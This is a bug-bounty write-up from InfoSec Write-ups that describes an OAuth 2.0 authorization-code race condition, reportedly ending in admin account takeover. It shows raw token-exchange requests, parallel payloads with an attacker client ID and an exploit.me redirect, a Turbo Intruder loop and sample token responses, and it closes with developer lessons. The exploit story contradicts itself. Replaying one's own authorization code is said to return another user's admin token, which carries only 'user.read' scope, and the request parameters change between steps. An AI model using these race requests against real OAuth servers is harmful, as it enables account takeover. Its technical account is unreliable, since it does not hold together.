---
title: How I Hijacked OAuth Tokens Through a Parallel Auth Flow Race Condition — $8500 P1 Bug Bounty
url: https://infosecwriteups.com/how-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-04-21
fetch_date: 2025-10-06T22:04:12.220395
---

# How I Hijacked OAuth Tokens Through a Parallel Auth Flow Race Condition — $8500 P1 Bug Bounty

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F7af1cccc4d4c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-7af1cccc4d4c---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-7af1cccc4d4c---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# How I Hijacked OAuth Tokens Through a Parallel Auth Flow Race Condition — $8500 P1 Bug Bounty 💰

[![Anmol Singh Yadav](https://miro.medium.com/v2/resize:fill:64:64/1*di3EOdQLWmJ687219D5s1g.jpeg)](https://medium.com/%40IamLucif3r?source=post_page---byline--7af1cccc4d4c---------------------------------------)

[Anmol Singh Yadav](https://medium.com/%40IamLucif3r?source=post_page---byline--7af1cccc4d4c---------------------------------------)

3 min read

·

Apr 20, 2025

--

4

Listen

Share

> “One man’s misconfiguration is another man’s bounty.

Here is the free link for this article: [Free Link](/how-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c?sk=6bd1e021f5d12676c5fee4fbb96f6ba9)

## Target Overview

The target was a popular **cloud-based business management platform** used by several Fortune 500 companies. It had SSO via **OAuth 2.0** and allowed third-party developers to integrate using the Authorization Code Grant flow.

The documentation seemed solid. The auth server used PKCE and had proper redirect URI whitelisting. Scopes were scoped, and refresh tokens had a short TTL.

But something caught my eye.

## What is an OAuth Vulnerability?

Press enter or click to view image in full size

![]()

Source: <https://portswigger.net/web-security/oauth>

OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user’s account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.

## The Flaw: A Parallel Authorization Flow Race Condition

While experimenting with the OAuth flow, I noticed the app allowed **multiple concurrent login requests** for the same session.

After digging in with Burp Suite’s ***Intruder***, I figured out that:

> *If I initiated two authorization requests in parallel with slightly manipulated* `state` *and* `code_verifier` *values, and timed the exchange right, both requests could return access tokens — one of which wasn't tied to my session.*

## Step-by-Step Exploitation

### 1. Start OAuth Flow Normally

Request:

```
GET /oauth/authorize?client_id=xyz&redirect_uri=...&state=ABC&code_challenge=...&response_type=code
```

Redirects to the login page as expected.

### 2. Intercept Code Exchange

Using Turbo Intruder, I simultaneously submitted two **token exchange** requests with different `code_verifier` and `state` values.

```
POST /oauth/token
Content-Type: application/x-www-form-urlencoded
grant_type=authorization_code&
code=xyz123&
code_verifier=fake123&
client_id=xyz
```

The **first request** was valid. The **second** shouldn’t have worked, but it did.

> ***I now had 2 access tokens: one for* my *session, and one for* someone else’s*.***

## Target Endpoint

```
POST /oauth/token HTTP/1.1
```

## 📥 Request Headers

```
Host: api.example.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Burp Suite Professional
Content-Length: 82
Accept: */*
Connection: close
```

## 🧪 Request Body (Payload #1)

```
grant_type=authorization_code
&code=xyz123
&code_verifier=fake123
&redirect_uri=https://exploit.me/callback
&client_id=attacker-client
```

## 🧪 Request Body (Payload #2 — sent 1ms later)

```
grant_type=authorization_code
&code=xyz123
&code_verifier=fake456
&redirect_uri=https://exploit.me/callback
&client_id=attacker-client
```

## ⚠️ Exploit Technique

Using Turbo Intruder with the following race condition logic:

```
for i in range(50):
    queue.push(build_request(), delay=0)
```

## 📤 Response 1 (Legitimate Token)

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 211
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOi...abc123",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "user.read",
  "refresh_token": "dGhpc2lzYXJlZnJlc2h0b2tlbg=="
}
```

## 📤 Response 2 (Bypassed Token — Same Code, Different Verifier)

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 211
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOi...xyz456",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "user.read",
  "refresh_token": "ZmFrZXJlZnJlc2h0b2tlbg=="
}
```

## 📊 Server-Side Flaw Summary

The the `/oauth/token` endpoint was **vulnerable to a race condition** where:

* A single `authorization_code` could be exchanged **multiple times**.
* Each request is with a different `code_verifier` still yielded valid `access_token`.
* The OAuth flow **failed to invalidate the authorization code after first use**, violating [[RFC 6749](https://www.rfc-editor.org/rfc/rfc6749.html) [§4.1.2](https://www.rfc-editor.org/rfc/rfc6749.html#section-4.1.2)].

## 🔐 Why This Is Dangerous

* I was able to **replay** an authorization code after a valid exchange.
* The server didn’t invalidate codes quickly enough.
* Due to a lack of token binding and weak state handling, it resulted in a **token leak**.

This meant a malicious actor could:

* Run multiple parallel auth flows
* Race the exchange
* Capture valid tokens for another user

## 💸 Impact

This was a classic **account takeover** — the access token I captured belonged to a privileged admin on the platform I was testing.

* **Severity:** P1 — Account Takeover via OAuth abuse
* **Reward:** 💰 $8500
* **Time to fix:** ~6 days
* **Response from the platform:** Extremely professional and thankful

## 📉 Lessons for Developers

* Always **invalidate auth codes** immediately after use
* Ensure **single-use** tokens with atomic checks
* Implement **binding** of `state` and `code_challenge` tightly
* Add **rate limits** on token exchange endpoints
* Consider **session-level token scope segregation**

## 📈 Lessons for Bug Hunters

T...